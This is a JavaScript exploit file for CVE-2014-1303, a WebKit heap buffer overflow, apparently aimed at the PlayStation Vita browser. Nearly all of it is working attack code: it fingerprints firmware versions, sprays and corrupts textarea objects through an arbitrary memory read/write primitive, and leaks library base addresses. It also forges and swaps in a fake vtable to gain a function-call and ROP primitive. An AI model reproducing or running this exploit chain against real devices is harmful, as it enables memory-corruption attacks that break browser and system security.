/*
    [CVE-2014-1303] Apple Safari Heap Based Buffer Overflow
*/

function initMemoryHole()
{
	try {
		
		// Check Vita version for ROP offsets.
		var user_agent = navigator.userAgent;
		if (user_agent.indexOf("Vita 3.30") != -1) {
			version = "v3_30";
		} else if (user_agent.indexOf("Vita 3.35") != -1) {
			version = "v3_35";
		} else if (user_agent.indexOf("Vita 3.36") != -1) {
			version = "v3_36";
		} else {
			document.write("</br>");document.write("Not Supported !");
			return -1;
		}
		
		document.write("</br>");document.write("Initialization");
		textareas = new Array();

		for (var i = 0; i < 0x2000; ++i) {
			var e = document.createElement("textarea");
			e.rows = 0x66656463;
			textareas.push(e);
		}

		var textarea_addr = 0;
		for (var x = 0; x < 0x10000; ++x) {
			var addr = 0x85200000 / 4 + x;
			if (aspace32[addr] == 0x66656463) {
				document.write("</br>");document.write("Changing textarea.rows at addr " + (addr * 4).toString(16));
				aspace32[addr] = 0x55555555;
				textarea_addr = addr * 4;
				break;
			}
		}

		var corrupted_textarea;
		for (var i = 0; i < textareas.length; ++i) {
			if (textareas[i].rows == 0x55555555) {
				corrupted_textarea = textareas[i];
				document.write("</br>");document.write("Found corrupted textarea at " + i);
				break;
			}
		}

		defineLibraryFuncs();
		defineOffsets();
		offsets = ver_offsets[version];

		var vtidx = textarea_addr + offsets.elementvtable_off;
		var textareavptr = aspace32[vtidx / 4];
		document.write("</br>");document.write("Textarea vptr: 0x" + textareavptr.toString(16));

		var setscrollleftptr = aspace32[textareavptr / 4 + offsets.setscrollleft_idx];
		document.write("</br>");document.write("WebCore::HTMLBodyElement::setScrollLeft is at 0x" + setscrollleftptr.toString(16));

		var scewkbase = setscrollleftptr - offsets.scewkbase_off;

		allocate_memory = init_memory(u32_base); // we should have 0x20040 bytes of memory we can freely use

		var fkvtable = allocate_memory(0x100 * 4);
		document.write("</br>");document.write("Fake vtable at: 0x" + fkvtable.toString(16));

		document.write("</br>");document.write("Copying vtable...");
		for (var i = 0; i < 0x100; i++) {
			aspace32[(fkvtable + (i << 2))/ 4] = aspace32[(textareavptr + (i << 2)) / 4];
		}

		aspace32[(vtidx) / 4] = fkvtable;

		var scelibcbase = get_base_from_offsets(scewkbase, offsets.scelibcentry_off, offsets.scelibcbase_off);
		
		document.write("</br>");document.write("-------------------------------------------------");
		document.write("</br>");document.write("SceWebkit base: 0x" + scewkbase.toString(16));
		document.write("</br>");document.write("SceLibc base: 0x" + scelibcbase.toString(16));
		document.write("</br>");document.write("-------------------------------------------------");

		var bases = {
			"SceWebKit": scewkbase,
			"SceLibc": scelibcbase
		};

		var tmpmem = allocate_memory(0x5000);
		caller = get_caller(tmpmem, corrupted_textarea, vtidx, fkvtable, version);
		libraries = init_ggts(bases, caller, version);

		var t = libraries.SceLibc.functions.time(0);
		document.write("</br>");document.write("Time: " + t);
		
		document.write("</br>");document.write("Exploit completed!\n");

		return aspace;
	}
	catch(e) {
        document.write("</br>");document.write("Error: " + e.line + " " + e);
        return -1;
    }

    return -1;
}